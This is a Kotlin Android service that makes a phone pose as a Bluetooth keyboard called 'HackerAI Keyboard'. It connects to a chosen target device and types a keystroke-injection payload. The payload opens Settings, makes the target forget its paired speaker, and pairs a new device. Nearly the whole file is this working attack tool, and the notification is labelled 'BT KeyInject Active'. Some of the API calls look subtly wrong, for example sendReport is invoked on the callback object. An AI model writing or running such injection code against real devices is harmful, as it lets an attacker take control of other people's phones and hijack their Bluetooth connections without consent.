package com.hackerai.btkeyboard

import android.app.*
import android.bluetooth.*
import android.bluetooth.BluetoothHidDevice.*
import android.content.*
import android.os.*

class HidDeviceService : Service() {

    private lateinit var bluetoothAdapter: BluetoothAdapter
    private lateinit var hidDevice: BluetoothHidDevice
    private var targetDevice: BluetoothDevice? = null
    private var hidCallback: BluetoothHidDeviceCallback? = null
    private var isRegistered = false

    // HID Report Descriptor for standard keyboard (104 keys)
    private val keyboardReportDescriptor = byteArrayOf(
        0x05, 0x01.toByte(),  // Usage Page (Generic Desktop)
        0x09, 0x06,           // Usage (Keyboard)
        0xA1, 0x01,           // Collection (Application)
        0x05, 0x07,           //   Usage Page (Key Codes)
        0x19, 0xE0.toByte(),  //   Usage Minimum (224)
        0x29, 0xE7.toByte(),  //   Usage Maximum (231)
        0x15, 0x00,           //   Logical Minimum (0)
        0x25, 0x01,           //   Logical Maximum (1)
        0x75, 0x01,           //   Report Size (1)
        0x95, 0x08,           //   Report Count (8)
        0x81, 0x02,           //   Input (Data,Var,Abs)
        0x95, 0x01,           //   Report Count (1)
        0x75, 0x08,           //   Report Size (8)
        0x81, 0x01,           //   Input (Const)
        0x95, 0x05,           //   Report Count (5)
        0x75, 0x01,           //   Report Size (1)
        0x05, 0x08,           //   Usage Page (LEDs)
        0x19, 0x01,           //   Usage Minimum (1)
        0x29, 0x05,           //   Usage Maximum (5)
        0x91, 0x02,           //   Output (Data,Var,Abs)
        0x95, 0x01,           //   Report Count (1)
        0x75, 0x03,           //   Report Size (3)
        0x91, 0x01,           //   Output (Const)
        0x95, 0x06,           //   Report Count (6)
        0x75, 0x08,           //   Report Size (8)
        0x15, 0x00,           //   Logical Minimum (0)
        0x25, 0x65.toByte(),  //   Logical Maximum (101)
        0x05, 0x07,           //   Usage Page (Key Codes)
        0x19, 0x00,           //   Usage Minimum (0)
        0x29, 0x65.toByte(),  //   Usage Maximum (101)
        0x81, 0x00,           //   Input (Data,Array)
        0xC0                  // End Collection
    )

    // USB HID Usage ID mappings
    private val keyMap = mapOf(
        'a' to 0x04, 'b' to 0x05, 'c' to 0x06, 'd' to 0x07,
        'e' to 0x08, 'f' to 0x09, 'g' to 0x0A, 'h' to 0x0B,
        'i' to 0x0C, 'j' to 0x0D, 'k' to 0x0E, 'l' to 0x0F,
        'm' to 0x10, 'n' to 0x11, 'o' to 0x12, 'p' to 0x13,
        'q' to 0x14, 'r' to 0x15, 's' to 0x16, 't' to 0x17,
        'u' to 0x18, 'v' to 0x19, 'w' to 0x1A, 'x' to 0x1B,
        'y' to 0x1C, 'z' to 0x1D,
        '1' to 0x1E, '2' to 0x1F, '3' to 0x20, '4' to 0x21,
        '5' to 0x22, '6' to 0x23, '7' to 0x24, '8' to 0x25,
        '9' to 0x26, '0' to 0x27,
        '\n' to 0x28, ' ' to 0x2C,
        '-' to 0x2D, '=' to 0x2E, '[' to 0x2F, ']' to 0x30,
        '\\' to 0x31, ';' to 0x33, '\'' to 0x34, '`' to 0x35,
        ',' to 0x36, '.' to 0x37, '/' to 0x38
    )

    override fun onCreate() {
        super.onCreate()
        val btManager = getSystemService(BLUETOOTH_SERVICE) as BluetoothManager
        bluetoothAdapter = btManager.adapter

        val profileListener = object : BluetoothProfile.ServiceListener {
            override fun onServiceConnected(profile: Int, proxy: BluetoothProfile) {
                hidDevice = proxy as BluetoothHidDevice
                registerHidApp()
            }

            override fun onServiceDisconnected(profile: Int) {
                isRegistered = false
            }
        }

        bluetoothAdapter.getProfileProxy(this, profileListener, BluetoothProfile.HID_DEVICE)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val targetAddr = intent?.getStringExtra("target_address")
        if (targetAddr != null) {
            targetDevice = bluetoothAdapter.getRemoteDevice(targetAddr)
        }

        val channel = NotificationChannel(
            "bt_hid_channel", "HID Service",
            NotificationManager.IMPORTANCE_LOW
        )
        (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(channel)

        val notification = Notification.Builder(this, "bt_hid_channel")
            .setContentTitle("BT KeyInject Active")
            .setContentText("Target: ${targetDevice?.name ?: "unknown"}")
            .setSmallIcon(android.R.drawable.ic_input_add)
            .setOngoing(true)
            .build()

        startForeground(1, notification)
        return START_STICKY
    }

    private fun registerHidApp() {
        val sdpSettings = BluetoothHidDeviceAppSdpSettings(
            "HackerAI Keyboard",
            "Bluetooth Keyboard",
            "HackerAI",
            SUBCLASS1_KEYBOARD,
            keyboardReportDescriptor
        )

        val qosSettings = BluetoothHidDeviceAppQosSettings(
            BluetoothHidDeviceAppQosSettings.SERVICE_BEST_EFFORT,
            10, 10, 100, 100, 100, 100
        )

        hidCallback = object : BluetoothHidDeviceCallback() {
            override fun onAppStatusChanged(pluggedDevice: BluetoothDevice?, registered: Boolean) {
                isRegistered = registered
                android.util.Log.i("HID", "App registered: $registered")

                if (registered && targetDevice != null) {
                    val success = hidDevice.connect(targetDevice)
                    android.util.Log.i("HID", "Connect initiated: $success")
                }
            }

            override fun onConnectionStateChanged(device: BluetoothDevice?, state: Int) {
                android.util.Log.i("HID", "State: $state device: ${device?.address}")

                if (state == BluetoothProfile.STATE_CONNECTED && device?.address == targetDevice?.address) {
                    android.util.Log.i("HID", "CONNECTED — sending payload!")
                    sendInjectionPayload(device)
                }
            }
        }

        hidDevice.registerApp(sdpSettings, null, qosSettings, {
            android.util.Log.i("HID", "Callback executed")
        }, hidCallback)
    }

    private fun sendInjectionPayload(device: BluetoothDevice) {
        Thread {
            try {
                Thread.sleep(1000)

                android.util.Log.i("PAYLOAD", "=== Starting keystroke injection ===")

                // Step 1: Open notification drawer + quick settings
                sendKey(device, 0xE3)                          // GUI key
                Thread.sleep(500)

                // Step 2: Open Settings
                sendString(device, "Settings\n")               // Type Settings + Enter
                Thread.sleep(1500)

                // Step 3: Navigate to Bluetooth
                for (i in 0..3) {
                    sendKey(device, 0x51)                      // DOWN
                    Thread.sleep(100)
                }
                sendKey(device, 0x28)                          // ENTER
                Thread.sleep(1000)

                // Step 4: Find connected speaker — navigate to it
                for (i in 0..2) {
                    sendKey(device, 0x51)                      // DOWN
                    Thread.sleep(150)
                }
                sendKey(device, 0x28)                          // ENTER (open options)
                Thread.sleep(800)

                // Step 5: Unpair/Forget
                sendKey(device, 0x51)                          // DOWN to "Forget"
                Thread.sleep(200)
                sendKey(device, 0x28)                          // ENTER
                Thread.sleep(300)
                sendKey(device, 0x28)                          // Confirm
                Thread.sleep(1500)

                // Step 6: Back + scan
                sendKey(device, 0x29)                          // ESC
                Thread.sleep(500)
                sendKey(device, 0x29)                          // ESC again
                Thread.sleep(500)

                // Step 7: Navigate to "Pair new device" or scan
                for (i in 0..5) {
                    sendKey(device, 0x52)                      // UP
                    Thread.sleep(100)
                }
                sendKey(device, 0x28)                          // ENTER to start scan
                Thread.sleep(2000)

                // Step 8: Your speaker should appear — connect to it
                sendKey(device, 0x28)                          // ENTER to select first found
                Thread.sleep(2000)
                sendKey(device, 0x28)                          // Confirm pairing
                Thread.sleep(1500)

                android.util.Log.i("PAYLOAD", "=== Injection complete ===")

            } catch (e: Exception) {
                android.util.Log.e("PAYLOAD", "Failed: ${e.message}")
            }
        }.start()
    }

    private fun sendKey(device: BluetoothDevice, keyCode: Int) {
        val report = byteArrayOf(
            0xA1.toByte(), 0x01, 0x00, 0x00,
            keyCode.toByte(), 0x00, 0x00, 0x00, 0x00
        )
        hidCallback?.sendReport(device, 0, report)
        Thread.sleep(20)
        val release = byteArrayOf(
            0xA1.toByte(), 0x01, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00
        )
        hidCallback?.sendReport(device, 0, release)
        Thread.sleep(15)
    }

    private fun sendString(device: BluetoothDevice, text: String) {
        for (char in text) {
            val lower = char.lowercaseChar()
            val code = keyMap[lower]
            if (code != null) {
                val shift = char.isUpperCase()
                val modByte = if (shift) 0x02 else 0x00
                val report = byteArrayOf(
                    0xA1.toByte(), 0x01, modByte.toByte(), 0x00,
                    code.toByte(), 0x00, 0x00, 0x00, 0x00
                )
                hidCallback?.sendReport(device, 0, report)
                Thread.sleep(20)
                val release = byteArrayOf(
                    0xA1.toByte(), 0x01, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00
                )
                hidCallback?.sendReport(device, 0, release)
                Thread.sleep(15)
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        if (::hidDevice.isInitialized && isRegistered) {
            hidDevice.unregisterApp()
        }
        stopForeground(STOP_FOREGROUND_REMOVE)
        super.onDestroy()
    }
}